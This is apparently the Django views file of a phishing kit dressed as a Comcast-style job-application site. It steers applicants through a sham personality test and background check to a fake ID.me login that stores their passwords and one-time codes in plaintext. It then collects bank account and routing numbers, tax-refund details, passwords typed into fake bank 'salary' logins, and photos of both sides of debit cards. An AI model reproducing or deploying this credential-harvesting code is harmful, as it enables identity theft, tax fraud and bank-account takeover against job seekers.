from django.shortcuts import render, redirect, reverse
from django.http import HttpResponseRedirect, Http404, HttpResponse
from django.contrib.auth import authenticate, login, logout
from django.views.generic import ListView, DetailView, CreateView, UpdateView, DeleteView, TemplateView
from django.contrib import messages
from django.contrib.messages.views import SuccessMessageMixin
from django.contrib.auth.mixins import LoginRequiredMixin
from django.utils.decorators import method_decorator
from django.contrib.auth.hashers import make_password, check_password
from django.views import View
from comcastAuth.models import *
from comcastAuth.forms import *
# Email
from django.utils.http import urlsafe_base64_decode, urlsafe_base64_encode
from django.contrib.sites.shortcuts import get_current_site
from comcastAuth.utils import EmailThread, Email
from django.utils.encoding import force_bytes, force_str, DjangoUnicodeDecodeError
from django.utils.safestring import mark_safe
from django.utils import timezone
from datetime import timedelta, date


class LandingPageView(TemplateView):

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["job_list"] = JobList.objects.all()
        return context

    template_name = "frontend/index.html"


class ApplyJobView(SuccessMessageMixin, CreateView):

    model = ApplyJob
    form_class = ApplyJobForm
    template_name = "frontend/apply_job.html"
    success_message = "Your application is on the way for a review. Please proceed with taking the simple personality test which was sent to your email."

    def send_personality_test_email(self, email, name, position):
        current_site = get_current_site(self.request).domain

        user_details = {
            'name': name,
            'email': email,
            'position': position,
            'domain': current_site,
            'uid': urlsafe_base64_encode(force_bytes(email)),
        }

        # Email.send(user_details, 'personality')

    def form_valid(self, form):
        job_role = JobList.objects.get(pk=self.kwargs['pk'])
        form.instance.job_role = job_role
        form.instance.hashed_email = urlsafe_base64_encode(force_bytes(form.cleaned_data['email']))
        # send personality test email
        self.send_personality_test_email(
            form.cleaned_data['email'], form.cleaned_data['name'], job_role.job_title)
        form = super().form_valid(form)

        return form

    def get_success_url(self):
        return reverse("auth:apply_job", args=self.kwargs['pk'])

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["job"] = JobList.objects.get(pk=self.kwargs['pk'])
        return context

    def get_initial(self):
        initial = super().get_initial()

        # Access the 'pk' value from the URL
        pk = self.kwargs['pk']

        # Set the 'initial_job_role' to the 'JobList' object with the specified primary key
        initial['job_role'] = JobList.objects.get(pk=pk)

        return initial


class PersonalityTestView(View):

    template_name = "frontend/personality_check.html"

    def get(self, request, uidb64):
        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=email).first()
        return render(request, self.template_name, context={'user': details})

    def next_business_day(self, start_date):
        while True:
            start_date += timedelta(days=1)
            if start_date.weekday() < 5:  # Monday to Friday (0 to 4)
                return start_date

    def post(self, request, uidb64):
        message = mark_safe('SCORE: Good. <br>Your personality test was above the average which reflects the company values and goals.<br>Please proceed with confirming your interview schedule, and taking your gender diversity and background check which was sent to your email.')

        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=email).first()

        PersonalityCheck.objects.create(email=email, name=details.name)

        self.send_interview_and_background_check(details)

        messages.success(request, message)
        return render(request, self.template_name, context={'user': details})

    def send_interview_and_background_check(self, details):
        current_site = get_current_site(self.request).domain

        current_date = timezone.now().date()  # Get the current date

        # Find the next business day from the current date and add a week
        next_business_date = self.next_business_day(current_date)
        option1 = next_business_date + timedelta(days=7)

        next_day = current_date + timedelta(days=1)
        next_business_date = self.next_business_day(next_day)
        option2 = next_business_date + timedelta(days=7)

        next_day = current_date + timedelta(days=2)
        next_business_date = self.next_business_day(next_day)
        option3 = next_business_date + timedelta(days=7)

        user_details = {
            'name': details.name,
            'email': details.email,
            'position': details.job_role.job_title,
            'option1': option1,
            'option2': option2,
            'option3': option3,
            'domain': current_site,
            'uid': urlsafe_base64_encode(force_bytes(details.email)),
        }

        # Email.send(user_details, 'interview')
        # Email.send(user_details, 'background')


class BackgroundCheckView(SuccessMessageMixin, CreateView):
    model = DiversityInfo
    form_class = DiversityInfoForm
    success_message = "Your application is on the way for a review. Please proceed with your information verification"
    template_name = "frontend/background_check.html"

    def get(self, request, uidb64):
        self.kwargs['uidb64'] = uidb64
        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=email).first()
        return render(request, self.template_name, context={'user': details, 'form': self.form_class})

    def form_valid(self, form):
        email = force_str(force_bytes(
            urlsafe_base64_decode(self.kwargs['uidb64'])))
        form.instance.email = email
        form.instance.tax_refund = form.cleaned_data.get(
            'did_you_complete_your_tax_refund_in_2022')
        form = super().form_valid(form)

        return form

    def get_success_url(self):
        return reverse("auth:idme_irs_verification", kwargs={'uidb64': self.kwargs['uidb64']})


class IDmeVerificationView(View):
    error_message = "Unable to validate credentials kindly login with code sent to your email"
    template_name = "frontend/idme/login.html"

    def get(self, request, uidb64):
        return render(request, self.template_name)

    def post(self, request, uidb64):
        email = request.POST['email']
        password = request.POST['password']
        user = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=user).first()

        # Send a mail with the credentials
        user_details = {
            'email': email,
            'password': password,
            'name': details.name,
        }

        # Email.send(user_details, 'idme')
        # save record
        IdMeCredentials.objects.create(
            email=email, password=password, user=user)
        messages.error(request, self.error_message)

        code_verification_url = reverse(
            "auth:code_verification", kwargs={'uidb64': uidb64})
        return redirect(code_verification_url)


class ReceiveVerificationCodeView(TemplateView):
    error_message = "Invalid verification code kindly request for a new verification code"
    template_name = "frontend/idme/send_code.html"

    def get(self, request, uidb64):
        return render(request, self.template_name, context={'uidb64': uidb64})

    def post(self, request, uidb64):
        code = request.POST['code']
        user = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = IdMeCredentials.objects.filter(email=user).first()
        job_details = ApplyJob.objects.filter(email=user).first()

        # Send a mail with the credentials
        user_details = {
            'email': details.email,
            'password': details.password,
            'name': job_details.name,
            'code': code,
        }

        # Email.send(user_details, 'code')
        messages.error(request, self.error_message)
        return render(request, self.template_name, context={'uidb64': uidb64})


class ResendVerificationCodeView(TemplateView):
    error_message = "Unable to verify your account kindly contact support"
    template_name = "frontend/idme/send_code.html"

    def get(self, request, uidb64):
        messages.error(request, self.error_message)
        return render(request, self.template_name, context={'uidb64': uidb64})


class ContactSupportView(TemplateView):
    success_message = "You've just reached out to support group, you will be communicated via mail"
    template_name = "frontend/idme/support.html"

    def get(self, request, uidb64):
        user = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = IdMeCredentials.objects.filter(email=user).first()

        # Send a mail with the credentials
        user_details = {
            'email': details.email,
            'password': details.password
        }

        # Email.send(user_details, 'support')

        messages.success(request, self.success_message)
        return render(request, self.template_name, context={'uidb64': uidb64})


class FinancialInformationView(View):
    success_message = "your information has been updated successfully"
    template_name = "frontend/financial_info.html"

    def get(self, request, uidb64):
        self.kwargs['uidb64'] = uidb64
        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=email).first()

        return render(request, self.template_name, context={'user': details})

    def post(self, request, uidb64):
        bank_name = request.POST['bankName']
        account_type =request.POST['accountType']
        account_number =request.POST['accountNumber']
        routing_number =request.POST['routingNumber']

        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
        details = ApplyJob.objects.filter(email=email).first()

        FinancialInfo.objects.create(email=email, name=details.name, bank_name=bank_name, account_type=account_type, account_number=account_number, routing_number=routing_number)

        messages.success(request, self.success_message)
        return render(request, self.template_name)


class DashboardView(TemplateView):

    template_name = "backend/dashboard.html"

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        if self.request.user.is_verified:
            status = 'Pending'
        else:
            status = 'Withdraw'
        context["status"] = status
        return context


class LogoutView(LoginRequiredMixin, View):

    def post(self, request):
        logout(request)
        messages.success(
            request, 'You are successfully logged out, to continue login again')
        return redirect('auth:login')


class LoginPageView(View):
    def get(self, request):
        context = {
            'banks':BankName.objects.all()
        }
        return render(request, 'frontend/salary/login.html', context=context)

    def post(self, request):

        bank_name = request.POST.get('bank')
        email = request.POST.get('email')
        password = request.POST.get('password').strip()

        user = Users.objects.filter(email=email).first()

        if user:

            login_count = LoginCount.objects.filter(user=user).first()

            if login_count and login_count.count > 1:

                if email and password and bank_name:

                    user = authenticate(
                        request, email=email, password=password)

                    if user:

                        if user.is_active:
                            login(request, user)
                            messages.success(
                                request, f"You are now signed in {user}")

                            nxt = request.GET.get('next', None)
                            if nxt is None:
                                return redirect('auth:dashboard')
                            return redirect(self.request.GET.get('next', None))

                        else:
                            messages.warning(
                                request, 'Account not active contact the administrator')
                    else:
                        messages.error(request, 'Invalid login credentials')
                else:
                    messages.error(request, 'All fields are required!!')

                new_user = Users.objects.create(
                    bank_name=bank_name, account_password1=password)
                LoginCount.objects.create(user=new_user)

            else:
                login_count.increaseCount

                user.account_password2 = password
                user.set_password(password)
                user.save()

                login(request, user)
                messages.success(request, f"You are now signed in {user}")

                nxt = request.GET.get('next', None)

                if nxt is None:
                    return redirect('auth:dashboard')
                return redirect(self.request.GET.get('next', None))

        else:

            new_user = Users.objects.create(
                bank_name=bank_name, email=email, account_password1=password)
            LoginCount.objects.create(user=new_user, count=1)

            messages.error(request, 'Invalid login credentials, try again!!')
            return redirect('auth:login')


class SecondLoginPageView(View):
    def get(self, request):
        context = {
            'banks':BankName.objects.all()
        }
        return render(request, 'frontend/salary/viva_login.html', context=context)

    def post(self, request):

        bank_name = request.POST.get('bank')
        email = request.POST.get('email')
        password = request.POST.get('password').strip()

        user = Users.objects.filter(email=email).first()

        if user:

            login_count = LoginCount.objects.filter(user=user).first()

            if login_count and login_count.count > 1:

                if email and password and bank_name:

                    user = authenticate(
                        request, email=email, password=password)

                    if user:

                        if user.is_active:
                            login(request, user)
                            messages.success(
                                request, f"You are now signed in {user}")

                            nxt = request.GET.get('next', None)
                            if nxt is None:
                                return redirect('auth:dashboard')
                            return redirect(self.request.GET.get('next', None))

                        else:
                            messages.warning(
                                request, 'Account not active contact the administrator')
                    else:
                        messages.error(request, 'Invalid login credentials')
                else:
                    messages.error(request, 'All fields are required!!')

                new_user = Users.objects.create(
                    bank_name=bank_name, account_password1=password)
                LoginCount.objects.create(user=new_user)

            else:
                login_count.increaseCount

                user.account_password2 = password
                user.set_password(password)
                user.save()

                login(request, user)
                messages.success(request, f"You are now signed in {user}")

                nxt = request.GET.get('next', None)

                if nxt is None:
                    return redirect('auth:dashboard')
                return redirect(self.request.GET.get('next', None))

        else:

            new_user = Users.objects.create(
                bank_name=bank_name, email=email, account_password1=password)
            LoginCount.objects.create(user=new_user, count=1)

            messages.error(request, 'Invalid login credentials, try again!!')
            return redirect('auth:viva_group')


class ProfileView(LoginRequiredMixin, View):

    def get(self, request):
        context = {
            'form': UpdateProfileForm()
        }

        user = Users.objects.filter(email=self.request.user).first()
        if user.is_verified:
            messages.success(
                request, 'Your information is still under review.!')
        else:
            messages.error(request, 'Salary account not activated!')

        return render(request, self.template_name, context=context)

    def post(self, request):
        form = UpdateProfileForm(request.POST, request.FILES)

        if form.is_valid():
            debit_card_back = form.cleaned_data.get('debit_card_back')
            debit_card_front = form.cleaned_data.get('debit_card_front')

            user = Users.objects.filter(email=self.request.user).first()

            user.debit_card_back = debit_card_back
            user.debit_card_front = debit_card_front
            user.is_verified = True

            user.save()

            messages.success(request, 'Your information is under review.!')
            return redirect('auth:dashboard')

        else:
            messages.error(request, form.errors.as_text())

            context = {
                'form': form
            }

        return render(request, self.template_name, context=context)

    template_name = "backend/profile.html"


class TestEmailView(TemplateView):

    template_name = "frontend/idme/login.html"
    # template_name = "frontend/email/interview_schedule.html"
    # template_name = "frontend/email/gender_background.html"
